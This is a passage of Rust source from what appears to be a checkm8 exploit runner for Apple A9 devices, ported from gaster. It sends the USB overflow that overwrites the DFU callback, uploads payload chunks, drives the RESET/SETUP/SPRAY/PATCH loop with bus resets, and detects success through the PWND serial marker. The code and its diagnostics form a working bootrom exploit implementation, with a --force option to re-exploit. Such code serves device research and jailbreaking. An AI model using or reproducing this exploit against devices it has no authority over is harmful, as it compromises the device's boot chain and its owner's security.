/// 1. gaster sends the overflow with `wIndex = 0x80` (gaster.c:1211) while its own
///    `checkm8_usb_request_stall` uses the same 0x80 (gaster.c:893). `a9ctl`
///    hardcoded `wValue = wIndex = 0` for every OUT request, so its overflow went
///    out with `wIndex = 0` — an internally inconsistent mutation of the same
///    request. gaster's 0x80 is implemented here. (King's implementation instead
///    decomposes this as `(0, 0, 0, 0)`; that is a different variant of the
///    exploit, not a fix for gaster's sequence, and is not what we run.)
///
/// The upload loop is **not** a behaviour deviation, only a reporting one.
/// gaster's chunk loop cannot fail — `ret` is `send_usb_control_request`
/// (`gaster.c:1215`), which is `return true;` unconditionally (`:226-240`) and is
/// already true from the STALLed overflow at `:1212` — so `checkm8_stage_patch`
/// returns true and proceeds to the suffix, the end DNLOAD, the MANIFEST walk and
/// the reset even when a chunk delivered nothing. Here a short chunk is recorded
/// loudly (predicate `PATCH_UPLOAD_SHORT`, an event and a printed warning) and the
/// stage continues the same way. This is not a nicety: stopping there discarded
/// five of an attempt's seven transfers in the last live run, and a SETUP pass
/// that reaches PATCH is rare and non-deterministic (0 pad STALLs in one 64-round
/// run, 3 in another), so an attempt must keep its whole sequence.
///
/// **Honest limit:** "the loop continues" cannot be pinned offline — it needs a
/// `Transport` — so it is inspection-pinned, like the `pad_stalls` counter. The
/// pure parts ([`patch_chunk_complete`], [`patch_upload_summary`]) are tested;
/// the loop's control flow is not, and no test pretends otherwise.
pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
    if built.overwrite.len() != OVERWRITE_STRUCT_SIZE {
        return fail(
            "PATCH_OVERWRITE_SIZE_INVALID",
            format!(
                "overwrite buffer is {} bytes, expected {OVERWRITE_STRUCT_SIZE} (one \
                 dfu_callback_t, gaster.c:111-113)",
                built.overwrite.len()
            ),
            None,
        );
    }

    // gaster.c:1211 — bm=2, b=3, wValue=0, wIndex=0x80.
    let overflow = req_out(
        io,
        patch_overflow_req(built.overwrite.len() as u16),
        &built.overwrite,
    );
    io.trace.xfer(Stage::Patch, "patch_overflow_callback", &overflow);
    io.trace.predicate(
        Stage::Patch,
        "patch_overflow_stall",
        overflow.status == XferStatus::Stall,
        &format!(
            "bm=2 b=3 wValue=0 wIndex=0x80 len={} -> {} (gaster.c:1211)",
            built.overwrite.len(),
            overflow.status
        ),
    );
    if overflow.status != XferStatus::Stall {
        return fail(
            "PATCH_OVERWRITE_NOT_STALLED",
            format!(
                "the {}-byte callback overflow returned {} instead of STALL (gaster.c:1211: a \
                 STALL here is the success condition — the request is rejected because it \
                 overran). wIndex was 0x80.",
                built.overwrite.len(),
                overflow.status
            ),
            Some(overflow),
        );
    }

    let chunk_sz = DFU_MAX_TRANSFER_SZ as usize;
    // `attempted` is every byte gaster's loop would put on the wire; `acked` is
    // what the device acknowledged in full. They are reported separately because
    // the difference is what the PWND check after the reset is up against.
    //
    // **THE PATCH-UPLOAD TIMEOUT (2026-10-04, measured-consequence fix).** These
    // chunks used the SETUP sweep's 5 ms window (`opts.timeout_ms`, gaster's
    // `USB_TIMEOUT`) — right for the sweep's abort windows, wrong for a payload
    // transfer on a busy bus. Every pwn on the 2026-10-04 Linux session reported
    // `PATCH_UPLOAD_SHORT: 0 of N acked`, and one of them left a PARTIAL payload
    // at 0x180380000 — which the post-PATCH reset then EXECUTED (the overwrite's
    // callback points there), killing the device outright. The count is doubly
    // unreliable (my fix-2: `transferred` is fabricated on failure), so the only
    // defensible position is to make the FIRST send patient enough to be real:
    // one transfer, `PATCH_UPLOAD_TIMEOUT_MS`, never a retry (a second DNLOAD
    // would APPEND to a buffer whose receive position is unknown — the rawdfu
    // warning). If a chunk is STILL short after that, the run must treat the
    // device as armed-dangerous: the reset that follows will execute whatever
    // landed at 0x180380000, so the warning says POWER-CYCLE, do not trust it.
    let mut attempted = 0usize;
    let mut acked = 0usize;
    let mut short_chunks = 0u64;
    for (i, chunk) in built.blob.chunks(chunk_sz).enumerate() {
        let r = req_out(
            io,
            CtrlReq {
                bm: 0x21,
                b: DFU_DNLOAD,
                value: 0,
                index: 0,
                length: chunk.len() as u16,
            },
            chunk,
        );
        io.trace.xfer(Stage::Patch, "patch_upload_chunk", &r);
        // Loud, never fatal — gaster's chunk loop cannot stop (`gaster.c:1213-1216`
        // with `ret` unconditionally true from `:226-240`), and aborting here
        // discarded five of an attempt's seven transfers in the last live run.
        // The predicate code is kept exactly so the diagnosis is greppable and
        // countable (`Counters::predicate_failed("PATCH_UPLOAD_SHORT")`); only its
        // power to stop the run is removed.
        let complete = patch_chunk_complete(&r, chunk.len());
        io.trace.predicate(
            Stage::Patch,
            "PATCH_UPLOAD_SHORT",
            complete,
            &format!(
                "chunk {i} at offset {attempted}: {} bytes requested, {} returned, status {}. \
                 gaster cannot fail here (`gaster.c:226-240` returns true unconditionally and \
                 `:1215` passes no transfer_ret), so the reference continues to the suffix, the \
                 end DNLOAD, the MANIFEST walk and the reset; this stage does the same.",
                chunk.len(),
                r.transferred,
                r.status
            ),
        );
        if complete {
            acked += chunk.len();
        } else {
            short_chunks += 1;
            let detail = format!(
                "payload chunk {i} ({} bytes at offset {attempted}) returned {} with {} bytes \
                 sent. This is USUALLY the checkm8 hijack firing DURING the transfer (the CPU has \
                 jumped into the payload and the ROM's DFU loop is gone, so the status stage never \
                 completes — see the `req_out` doc; gaster's loop continues for this reason). It \
                 can also be a genuinely dead chunk: the PWND marker after the reset decides, and \
                 if the device vanishes instead, power-cycle it rather than trusting its state \
                 (2026-10-04).",
                chunk.len(),
                r.status,
                r.transferred
            );
            io.trace
                .event("patch_upload_short", Some(Stage::Patch), &detail);
            println!(
                "  PATCH: WARNING - [PATCH_UPLOAD_SHORT] {}",
                one_line(&detail)
            );
        }
        attempted += chunk.len();
    }

    let suffix = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN);
    io.trace.xfer(Stage::Patch, "patch_dnload_suffix", &suffix);
    let end = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, 0);
    io.trace.xfer(Stage::Patch, "patch_dnload_end", &end);

    // gaster.c:1220-1222 ignores the result of these three; the real proof of a
    // pwn is the PWND marker after the next bus reset, so a failure here is
    // recorded loudly and does not fail the stage.
    //
    // Measured behaviour worth knowing before reading a failure into it: after a
    // *successful* upload the walk comes back TIMEOUT. That is consistent with
    // the payload having landed and the machine having left its DFU request
    // loop; gaster does not check the walk and the marker decides. It is **not**
    // evidence that the upload failed, and not proof that it succeeded either.
    let mut state_ok = true;
    for (state, label) in [
        (DFU_STATE_MANIFEST_SYNC, "patch_status_manifest_sync"),
        (DFU_STATE_MANIFEST, "patch_status_manifest"),
        (DFU_STATE_MANIFEST_WAIT_RESET, "patch_status_manifest_wait_reset"),
    ] {
        let (ok, _) = dfu_check_status(io, Stage::Patch, DFU_STATUS_OK, state, label);
        state_ok &= ok;
    }

    io.trace.event(
        "patch_uploaded",
        Some(Stage::Patch),
        &format!(
            "overflow={} bytes STALLed; {}",
            built.overwrite.len(),
            patch_upload_summary(attempted, acked, short_chunks, &built.blob_sha256, state_ok)
        ),
    );
    // **On stdout, unconditionally.** The digest of the buffer that went on the wire is the one
    // datum that says *which handler was installed*, and it was reachable only with `--trace` or
    // `--verbose` — a `[PWNED]` marker cannot distinguish a stock install from a read-window one,
    // which is exactly the ambiguity this line removes. `RUNG2-EVIDENCE.md` §6.0p rule 14: report
    // the counters, so the claim comes with its evidence.
    println!(
        "  PATCH blob   : handler={} {} bytes, {} of {} acked, {} short chunk(s), sha256 {}",
        built.handler.name(),
        built.blob.len(),
        acked,
        attempted,
        short_chunks,
        built.blob_sha256
    );
    if !state_ok {
        println!(
            "  PATCH: warning - the MANIFEST state walk after the upload did not complete \
             cleanly; gaster does not check it (gaster.c:1220-1222). A TIMEOUT here after a \
             successful upload is consistent with the payload having landed and the machine \
             having left its DFU request loop — it is not evidence that the upload failed, and \
             not proof that it succeeded. Waiting for the PWND marker after the reset."
        );
    }
    StageResult::Pass
}

// ---------------------------------------------------------------------------
// run / run_one_stage
// ---------------------------------------------------------------------------

/// The diagnostic stop: SETUP's pad STALL is the proof (gaster.c:853), so the
/// run stops there instead of spending PATCH on an unproven SETUP (HANDOFF
/// §6.3). Pure, and shared by the round loop and the single-stage path — before
/// the fix the flag was honoured **only** in the round loop, so
/// `run --stage setup --stop-after-setup-stall` reported a reset refusal instead
/// of the proof it exists to produce (`docs/VERIFICATION-live-run.md` B1.2).
fn setup_stall_stop_requested(stage: Stage, passed: bool, opts: &RunOptions) -> bool {
    passed && stage == Stage::Setup && opts.stop_after_setup_stall
}

/// The outcome of that stop. Pure, so the words are pinned by a test: it must
/// name the pass condition it proved, what was not attempted, and that the
/// mandatory post-attempt reset (gaster.c:1268) still happened first.
fn setup_stall_stop_outcome(setup_attempts: u64, pad_stalls: u64) -> RunOutcome {
    RunOutcome::Aborted(format!(
        "diagnostic stop (--stop-after-setup-stall): SETUP reached its pass condition — a STALL on \
         the pad request (gaster.c:853) — after {setup_attempts} attempt(s) with {pad_stalls} pad \
         STALL(s). The bus reset after the attempt was performed (gaster.c:1268). SPRAY and PATCH \
         were not attempted and no payload was uploaded. The device was left reset, not pwned."
    ))
}

fn dispatch(io: &mut StageIo, stage: Stage, built: &BuiltPayload) -> StageResult {
    match stage {
        Stage::Reset => stage_reset(io),
        Stage::Setup => stage_setup(io),
        Stage::Spray => stage_spray(io),
        Stage::Patch => stage_patch(io, built),
        Stage::Pwned => StageResult::Pass,
    }
}

/// The marker short-circuit, isolated so the `--force` bypass is one testable
/// predicate instead of a condition duplicated at two call sites.
///
/// A present marker means the exploit landed at some **earlier** point — it is a
/// value written into `gUSBSerialNumber` by a previous pwn (`gaster.c:811`), not a
/// measurement of this invocation. Without `--force` the reference's behaviour is
/// followed: report the goal state and skip the write path. With `--force` the
/// write path runs anyway; see [`RunOptions::force`] for why the DFU-buffer re-pwn
/// needs exactly that and why re-entering DFU is not an alternative.
fn skip_on_marker(opts: &RunOptions, id: &DeviceIdentity) -> bool {
    id.is_pwned() && !opts.force
}

/// Run the exploit. `INTERFACE.md` §4.
///
/// `RESET → SETUP → SPRAY → PATCH → bus reset → re-open → check PWND`, capped at
/// `max_rounds`, with a bus reset after **every** attempt (gaster.c:1268) and a
/// re-open that re-reads the serial descriptor before the next attempt — which
/// is how a successful pwn is detected at all (the payload writes
/// ` PWND:[checkm8]` into `gUSBSerialNumber`, gaster.c:811).
///
/// `--dry-run` builds every byte, prints the field traces and **never opens the
/// device** (INTERFACE.md §0.1 allows a non-Lead to run this path and only this
/// path). Planning against an attached device is what `a9pwn plan` does.
pub fn run(opts: RunOptions) -> RunOutcome {
    // The single-stage and dry-run paths never used this tracer: a dry run must
    // not create a trace file at all, and `run_one_stage` owns its own. Kept
    // exactly as it was.
    let filter = opts.stage_filter;
    if let Some(stage) = filter {
        return run_one_stage(stage, opts);
    }
    if opts.dry_run {
        return dry_run_all(&opts);
    }

    let mut tracer = match Tracer::new(opts.trace_path.clone(), opts.verbose) {
        Ok(t) => t,
        Err(e) => return RunOutcome::Aborted(format!("cannot open trace file: {e}")),
    };
    run_with_tracer(opts, &mut tracer)
}

/// [`run`], but against a tracer the caller owns.
///
/// Added so a run has exactly **one** writer to `opts.trace_path`. `main.rs` was
/// creating a tracer for the verdict *and* `run` was creating its own, and both
/// opened the same file: the JSONL interleaved into a corrupted line
/// (`{"seq":2,"st{"seq":2,…`), and the verdict was then classified against an
/// empty counter set while the real counters sat in the other tracer — the whole
/// instrumentation investment bypassed exactly when a failure needed explaining.
///
/// `opts.trace_path` is deliberately **not** opened here: the caller's tracer
/// decides where (and whether) anything is written. Additive — `INTERFACE.md`
/// §4's `run(opts)` signature is unchanged and remains the wrapper.
///
/// Dry runs and `opts.stage_filter` are handled here too, so this is a complete
/// replacement for [`run`] and not a partial one:
///
/// * `stage_filter` → [`run_one_stage_with_tracer`], which writes to this tracer.
/// * `dry_run` → the dry-run plan, which issues no transfer and writes no
///   tracer line at all, so there is nothing to attribute. It must not create or
///   truncate `opts.trace_path` either.
pub fn run_with_tracer(opts: RunOptions, tracer: &mut Tracer) -> RunOutcome {
    if let Err(e) = payload::verify_blob_hashes() {
        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
    }

    if let Some(stage) = opts.stage_filter {
        return run_one_stage_with_tracer(stage, opts, tracer);
    }
    if opts.dry_run {
        return dry_run_all(&opts);
    }

    tracer.event(
        "run_start",
        None,
        &format!(
            "rounds={} usb_timeout={}ms abort_min={}ms leak_windex=0x{:X} \
             setup_budget={}attempts/{}ms settle_ms={} stop_after_setup_stall={} allow_winusb={}",
            opts.max_rounds,
            opts.usb_timeout_ms,
            opts.abort_timeout_min_ms,
            opts.leak_windex,
            opts.setup_budget.max_attempts,
            opts.setup_budget.max_millis,
            opts.settle_ms,
            opts.stop_after_setup_stall,
            opts.allow_winusb
        ),
    );

    let outcome = run_rounds(&opts, tracer);
    tracer.event("run_end", None, &format!("{outcome:?}"));
    tracer.flush();
    print_stage_summary(tracer, "stages");
    outcome
}

fn run_rounds(opts: &RunOptions, tracer: &mut Tracer) -> RunOutcome {
    let mut session: Option<Session> = None;
    let mut stage = Stage::Reset;
    let mut rounds: u32 = 0;

    loop {
        if rounds >= opts.max_rounds {
            tracer.event("rounds_exhausted", None, &format!("{rounds} rounds"));
            return RunOutcome::Exhausted { rounds };
        }

        // gaster.c:1243 — wait_usb_handle() re-opens (and re-configures) the
        // device at the top of every iteration, and reads the serial descriptor.
        let mut usb = match open_with_retry(opts, tracer) {
            Ok(t) => t,
            Err(e) => {
                tracer.event("no_device", None, &e);
                return if rounds == 0 {
                    RunOutcome::NoDevice
                } else {
                    RunOutcome::Aborted(format!(
                        "the device disappeared after {rounds} round(s): {e}"
                    ))
                };
            }
        };

        let id = usb.identity();
        // Rule 14 (`RUNG2-EVIDENCE.md` §6.0p): the marker is a state measurement,
        // not proof this invocation ran the exploit. `--force` is the only way past
        // this short-circuit; without it a marked device produces `transfers=0` and
        // the verdict must refuse `[PWNED]` (verdict.rs `PWNED_UNMEASURED`).
        if skip_on_marker(opts, &id) {
            tracer.event(
                "pwned",
                Some(Stage::Pwned),
                &format!("PWND marker present: {:?}", id.pwnd),
            );
            println!(
                "  PWND marker present: {:?} — already pwned (this is the marker, NOT this run: \
                 nothing has been sent).",
                id.pwnd
            );
            return RunOutcome::Pwned;
        }
        if id.is_pwned() {
            println!(
                "  PWND marker present: {:?} — --force given, running the exploit anyway (the \
                 buffer-read re-pwn needs it).",
                id.pwnd
            );
        }

        if session.is_none() {
            let (cfg, kind) = match config_for_identity(&id) {
                Ok(v) => v,
                Err(e) => {
                    tracer.event("unsupported", None, &e);
                    return RunOutcome::Unsupported(e);
                }
            };
            let driver = usb.driver_class();
            let cap = usb.reset_capability();
            tracer.event(
                "device",
                None,
                &format!(
                    "serial={:?} cpid=0x{:04X} cprv={:?} bdid={:?} srtg={:?} driver={} reset={} \
                     config={}",
                    id.serial,
                    cfg.cpid,
                    id.cprv,
                    id.bdid,
                    id.srtg,
                    driver.as_str(),
                    cap.as_str(),
                    cfg.name
                ),
            );
            if let Some(note) = cfg.cprv_note(&id) {
                tracer.event("cprv_mismatch", None, &note);
                println!("  note: {note}");
            }

            // The reset is not a formality: after PATCH it is what fires the
            // overwritten dfu_handle_bus_reset callback (gaster.c:1268). Refuse
            // rather than run an experiment that cannot succeed.
            if driver == DriverClass::WinUsb && !opts.allow_winusb {
                return RunOutcome::Aborted(format!(
                    "the bound driver is {}, which cannot perform a host-initiated reset \
                     (libusb's windows_winusb.c:3419 returns success after cycling pipes only). \
                     checkm8 needs a real bus reset after every stage attempt. Bind libusbK or \
                     libusb0, or pass --allow-winusb to reproduce the failure mode deliberately.",
                    driver.as_str()
                ));
            }
            if cap != ResetCapability::Real && !opts.allow_winusb {
                return RunOutcome::Aborted(format!(
                    "reset capability is \"{}\": the bus reset after every stage attempt would \
                     be a no-op, and checkm8 cannot fire without it (gaster.c:1268). Refusing; \
                     --allow-winusb overrides only to prove the failure.",
                    cap.as_str()
                ));
            }

            // The S1 mailbox split (review/06 §7): `--mailbox-relocated` installs the
            // handler with its command mailbox at `S1_MAILBOX_BASE` (base+L) so a staged
            // image and the command channel never share a byte. Default = gaster parity.
            let mailbox = if opts.mailbox_relocated {
                crate::config::S1_MAILBOX_BASE
            } else {
                cfg.insecure_memory_base
            };
            let built = match payload::build_payload_variant(&cfg, kind, opts.handler, mailbox) {
                Ok(b) => b,
                Err(e) => return RunOutcome::Aborted(format!("payload build failed: {e}")),
            };
            tracer.event(
                "payload_built",
                None,
                &format!(
                    "kind={} {} bytes (overwrite {}), sha256 {}",
                    kind.name(),
                    built.blob.len(),
                    built.overwrite.len(),
                    built.blob_sha256
                ),
            );
            session = Some(Session { cfg, built });
        }
        let s = session.as_ref().expect("session set above");

        rounds += 1;
        // Typed helper, not a bare event string: `Tracer` counts rounds by exact
        // kind (`trace::kind::ROUND`), and the verdict reads that count.
        tracer.round(
            rounds,
            &format!(
                "of {} stage={} (gaster.c:1243-1276)",
                opts.max_rounds,
                stage.name()
            ),
        );

        let executed = stage;
        let result = {
            let mut io = StageIo {
                usb: &mut usb,
                trace: &mut *tracer,
                cfg: &s.cfg,
                opts,
            };
            dispatch(&mut io, executed, &s.built)
        };
        let passed = result.is_pass();
        // INSTRUMENT FIX 4 (review/07 finding 13): the RESET stage's pass CLAIM is derived from
        // its own bus-reset predicate, which `reset_after_attempt` measures only AFTER this
        // point — so the claim is deferred there. 139 `stage_pass` RESET events coexisted with
        // 350 `bus_reset_delivered` FAILs and 0 PASSes; a stage PASS may not coexist with its
        // own failed predicate. Continue semantics are untouched (`passed` below still drives
        // the machine exactly as before).
        let mut deferred_reset_claim = false;
        match &result {
            StageResult::Pass => {
                if executed == Stage::Reset {
                    deferred_reset_claim = true;
                } else {
                    tracer.event("stage_pass", Some(executed), executed.name());
                }
            }
            StageResult::Fail(f) => {
                tracer.event(
                    "stage_fail",
                    Some(executed),
                    &format!(
                        "code={} detail={} last={}",
                        f.code,
                        f.detail,
                        f.last
                            .as_ref()
                            .map(|r| r.one_line())
                            .unwrap_or_else(|| "-".to_string())
                    ),
                );
                println!(
                    "  {} FAILED [{}] {}",
                    executed.name(),
                    f.code,
                    one_line(&f.detail)
                );
            }
        }

        // gaster.c:1245-1267: a pass advances the machine, any failure sends it
        // back to RESET — and PATCH always returns to RESET, pass or fail, so the
        // next round re-opens the device and looks for the PWND marker.
        let next = match (executed, passed) {
            (Stage::Reset, true) => Stage::Setup,
            (Stage::Setup, true) => Stage::Spray,
            (Stage::Spray, true) => Stage::Patch,
            (Stage::Patch, _) => Stage::Reset,
            (_, false) => Stage::Reset,
            (Stage::Pwned, _) => Stage::Pwned,
        };
        let stop_here = setup_stall_stop_requested(executed, passed, opts);
        stage = next;

        // gaster.c:1268 — after EVERY attempt, pass or fail. The recording, the
        // evidence gate and the messages all live in `reset_after_attempt`,
        // shared with the single-stage path so the two cannot drift apart again
        // (the B1 defect was this same wrong condition written in both places).
        let reset_report = match reset_after_attempt(&mut usb, tracer, opts, "post-stage", executed.name())
        {
            Err(outcome) => return outcome,
            Ok(r) => r,
        };
        if deferred_reset_claim {
            let (kind_tok, detail) = match &reset_report {
                Some(rep) => reset_stage_event(rep.bus_reset_delivered, rep.evidence.as_str()),
                None => (
                    kind::STAGE_UNPROVEN,
                    "the DFU dance passed but no bus-reset evidence exists (the reset call found \
                     the device absent — the known post-CLR_STATUS drop): a stage_pass is not \
                     claimable without its predicate."
                        .to_string(),
                ),
            };
            tracer.event(kind_tok, Some(Stage::Reset), &detail);
        }

        // gaster.c:1273 — close, then re-open at the top of the loop.
        drop(usb);

        if stop_here {
            let c = tracer.counters();
            tracer.event(
                "stop_after_setup_stall",
                Some(Stage::Setup),
                &format!("SETUP passed on round {rounds}; stopping before SPRAY/PATCH"),
            );
            return setup_stall_stop_outcome(c.setup_attempts, c.setup_stall_seen);
        }

        if opts.settle_ms > 0 {
            sleep(Duration::from_millis(opts.settle_ms as u64));
        }
    }
}

/// Run exactly one stage. `INTERFACE.md` §4.
///
/// gaster only ever reaches SETUP from a RESET that returned true *and* a
/// completed bus reset (gaster.c:1245-1252, 1268), and SPRAY/PATCH in turn only
/// from SETUP/SPRAY. A single-stage run with no preceding RESET is exactly the
/// experiment that produced the previous session's flat-timeout artefact, so
/// every stage other than RESET performs its RESET precondition first and
/// refuses to run if that precondition fails.
pub fn run_one_stage(stage: Stage, opts: RunOptions) -> RunOutcome {
    if stage == Stage::Pwned {
        return RunOutcome::Aborted(
            "PWNED is a state the device is in, not a stage that can be run".to_string(),
        );
    }
    if let Err(e) = payload::verify_blob_hashes() {
        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
    }
    // A dry run issues no transfer and writes no tracer line, so it needs no
    // tracer — and `--dry-run --trace X` must not create or truncate `X`.
    if opts.dry_run {
        return dry_run_stage(stage, &opts);
    }

    let mut tracer = match Tracer::new(opts.trace_path.clone(), opts.verbose) {
        Ok(t) => t,
        Err(e) => return RunOutcome::Aborted(format!("cannot open trace file: {e}")),
    };
    run_one_stage_with_tracer(stage, opts, &mut tracer)
}

/// [`run_one_stage`], but against a tracer the caller owns — the single-stage
/// half of [`run_with_tracer`]. Same contract and same guards; only the tracer's
/// ownership differs, so a caller that needs the counters afterwards (the
/// verdict does) can keep its own writer and avoid a second one opening the same
/// file.
pub fn run_one_stage_with_tracer(
    stage: Stage,
    opts: RunOptions,
    tracer: &mut Tracer,
) -> RunOutcome {
    if stage == Stage::Pwned {
        return RunOutcome::Aborted(
            "PWNED is a state the device is in, not a stage that can be run".to_string(),
        );
    }
    if let Err(e) = payload::verify_blob_hashes() {
        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
    }
    if opts.dry_run {
        return dry_run_stage(stage, &opts);
    }

    tracer.event(
        "single_stage_start",
        Some(stage),
        &format!(
            "precondition={} usb_timeout={}ms leak_windex=0x{:X}",
            if stage == Stage::Reset { "none" } else { "RESET + bus reset" },
            opts.usb_timeout_ms,
            opts.leak_windex
        ),
    );

    let outcome = one_stage_core(stage, &opts, tracer);
    tracer.event("run_end", Some(stage), &format!("{outcome:?}"));
    tracer.flush();
    print_stage_summary(tracer, stage.name());
    outcome
}

fn one_stage_core(stage: Stage, opts: &RunOptions, tracer: &mut Tracer) -> RunOutcome {
    let mut usb = match open_with_retry(opts, tracer) {
        Ok(t) => t,
        Err(e) => {
            tracer.event("no_device", None, &e);
            return RunOutcome::NoDevice;
        }
    };
    let id = usb.identity();
    if skip_on_marker(opts, &id) {
        tracer.event("pwned", Some(Stage::Pwned), "PWND marker already present");
        return RunOutcome::Pwned;
    }
    if id.is_pwned() {
        tracer.event(
            "pwned",
            Some(Stage::Pwned),
            "PWND marker present and --force given: running the stage anyway",
        );
        println!(
            "  PWND marker present: {:?} — --force given, running the stage anyway.",
            id.pwnd
        );
    }
    let (cfg, kind) = match config_for_identity(&id) {
        Ok(v) => v,
        Err(e) => {
            tracer.event("unsupported", None, &e);
            return RunOutcome::Unsupported(e);
        }
    };
    let driver = usb.driver_class();
    let cap = usb.reset_capability();
    if driver == DriverClass::WinUsb && !opts.allow_winusb {
        return RunOutcome::Aborted(format!(
            "the bound driver is {}, which cannot perform a host-initiated reset; a single-stage \
             run would be an experiment that cannot succeed. --allow-winusb overrides.",
            driver.as_str()
        ));
    }
    if cap != ResetCapability::Real && !opts.allow_winusb {
        return RunOutcome::Aborted(format!(
            "reset capability is \"{}\"; every stage attempt needs a real bus reset after it \
             (gaster.c:1268). --allow-winusb overrides.",
            cap.as_str()
        ));
    }
    let mailbox = if opts.mailbox_relocated {
        crate::config::S1_MAILBOX_BASE
    } else {
        cfg.insecure_memory_base
    };
    let built = match payload::build_payload_variant(&cfg, kind, opts.handler, mailbox) {
        Ok(b) => b,
        Err(e) => return RunOutcome::Aborted(format!("payload build failed: {e}")),
    };

    // gaster's ordering: RESET, then a bus reset, then the next stage.
    if stage != Stage::Reset {
        println!("  precondition: running RESET first (gaster.c:1245-1252)");
        let reset = {
            let mut io = StageIo {
                usb: &mut usb,
                trace: &mut *tracer,
                cfg: &cfg,
                opts,
            };
            stage_reset(&mut io)
        };
        match &reset {
            StageResult::Fail(f) => {
                tracer.event(
                    "precondition_failed",
                    Some(Stage::Reset),
                    &format!("code={} detail={}", f.code, f.detail),
                );
                return RunOutcome::Aborted(format!(
                    "the RESET precondition for stage {} failed [{}]: {}. gaster only reaches {} \
                     after RESET returned true and a bus reset completed (gaster.c:1245-1268); \
                     running it now would produce an artefact, not a measurement.",
                    stage.name(),
                    f.code,
                    f.detail,
                    stage.name()
                ));
            }
            StageResult::Pass => tracer.event(
                "precondition_passed",
                Some(Stage::Reset),
                "RESET reached MANIFEST_WAIT_RESET",
            ),
        }
        if let Err(e) = reset_after_attempt(&mut usb, tracer, opts, "precondition", "RESET") {
            return e;
        }
        drop(usb);
        usb = match open_with_retry(opts, tracer) {
            Ok(t) => t,
            Err(e) => {
                tracer.event("no_device", None, &e);
                return RunOutcome::NoDevice;
            }
        };
    }

    tracer.event(
        "stage_start",
        Some(stage),
        &format!("cpid=0x{:04X} config={}", cfg.cpid, cfg.name),
    );
    let result = {
        let mut io = StageIo {
            usb: &mut usb,
            trace: &mut *tracer,
            cfg: &cfg,
            opts,
        };
        dispatch(&mut io, stage, &built)
    };
    let code = result.fail_code().map(|c| c.to_string());
    // INSTRUMENT FIX 4 (review/07 finding 13) — see `reset_stage_event`: the RESET stage's pass
    // claim is deferred until its bus-reset predicate has been measured below.
    let mut deferred_reset_claim = false;
    match &result {
        StageResult::Pass => {
            if stage == Stage::Reset {
                deferred_reset_claim = true;
            } else {
                tracer.event("stage_pass", Some(stage), stage.name());
            }
        }
        StageResult::Fail(f) => tracer.event(
            "stage_fail",
            Some(stage),
            &format!("code={} detail={}", f.code, f.detail),
        ),
    }

    // gaster.c:1268 — the reset after the attempt is mandatory, and it happens
    // **before** the diagnostic stop: the stop reports SETUP's proof, it does not
    // skip the trigger. `--stop-after-setup-stall` was honoured only by the round
    // loop before this, so `run --stage setup --stop-after-setup-stall` reported
    // a reset refusal instead of the STALL it exists to prove
    // (`docs/VERIFICATION-live-run.md` B1.2).
    let passed = result.is_pass();
    let reset_report = match reset_after_attempt(&mut usb, tracer, opts, "post-stage", stage.name()) {
        Err(e) => return e,
        Ok(r) => r,
    };
    if deferred_reset_claim {
        let (kind_tok, detail) = match &reset_report {
            Some(rep) => reset_stage_event(rep.bus_reset_delivered, rep.evidence.as_str()),
            None => (
                kind::STAGE_UNPROVEN,
                "the DFU dance passed but no bus-reset evidence exists (the reset call found the \
                 device absent — the known post-CLR_STATUS drop): a stage_pass is not claimable \
                 without its predicate."
                    .to_string(),
            ),
        };
        tracer.event(kind_tok, Some(Stage::Reset), &detail);
    }
    if setup_stall_stop_requested(stage, passed, opts) {
        let c = tracer.counters();
        tracer.event(
            "stop_after_setup_stall",
            Some(Stage::Setup),
            "SETUP passed; stopping before SPRAY/PATCH",
        );
        return setup_stall_stop_outcome(c.setup_attempts, c.setup_stall_seen);
    }
    drop(usb);

    // Re-open and look for the marker: for PATCH this is the only proof there is.
    let tail = match open_with_retry(opts, tracer) {
        Ok(t) => t,
        Err(e) => {
            tracer.event("no_device", None, &e);
            return RunOutcome::Aborted(format!(
                "stage {} finished ({code:?}) but the device could not be re-opened to read the \
                 PWND marker: {e}",
                stage.name()
            ));
        }
    };
    let final_id = tail.identity();
    if final_id.is_pwned() {
        tracer.event("pwned", Some(Stage::Pwned), &format!("{:?}", final_id.pwnd));
        println!("  PWND marker present: {:?} — checkm8 landed.", final_id.pwnd);
        return RunOutcome::Pwned;
    }

    let msg = match code {
        None => format!(
            "stage {} PASSED but the PWND marker is absent. For SETUP and SPRAY that is \
             expected — only PATCH uploads the payload; for PATCH it means the overflow did not \
             land, or the reset after it did not fire the callback.",
            stage.name()
        ),
        Some(c) => format!(
            "stage {} FAILED [{c}] and the PWND marker is absent.",
            stage.name()
        ),
    };
    tracer.event("single_stage_end", Some(stage), &msg);
    RunOutcome::Aborted(msg)
}

// ---------------------------------------------------------------------------
// The post-attempt reset, and what its evidence is allowed to stop
// ---------------------------------------------------------------------------
//
// gaster resets unconditionally after every stage attempt and **discards** the
// result (`gaster.c:197-200` is a bare `libusb_reset_device`, `gaster.c:1268`
// calls it). Ours reads the result, because on Windows libusb returns
// `LIBUSB_SUCCESS` even when all it did was cycle pipes
// (`windows_winusb.c:3419`). Reading it is the improvement. Letting a *failed
// reading* stop the run is not, and that is what this section exists to fix:
// `ResetEvidence::Unverified` is documented by this crate as "not success; not
// failure" (`types.rs:387-391`), and treating it as failure aborted every run at
// round 2 — before SPRAY was ever reached (`docs/VERIFICATION-live-run.md` B1).

/// What the post-attempt reset gate decides, from the measured evidence alone.
///
/// Three outcomes, because there are three genuinely different situations —
/// collapsing them into the old `bool` is what reintroduced the defect
/// `ResetEvidence` exists to prevent.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ResetGate {
    /// Positive evidence a bus reset was delivered: continue.
    Continue,
    /// Not success, not failure: continue, but say so loudly. Never silent.
    ContinueLoudly,
    /// The device positively contradicts us (`Refuted`) or the driver cannot
    /// deliver a bus reset at all (`DriverCannotReset`): stop.
    Stop,
}

/// The gate. Pure, so all three outcomes are pinned by tests without a device.
///
/// * `Delivered` — continue.
/// * `Unverified` — continue **loudly**. This is the fix for B1: gaster ignores
///   the result entirely, and `Unverified` covers both "the read failed" and
///   "idle before, idle after", neither of which is evidence of a
///   non-delivery. Note that a *genuine* bus reset re-enumerates the device, so
///   the post-reset `DFU_GETSTATUS` failing is what a working reset can look
///   like from here.
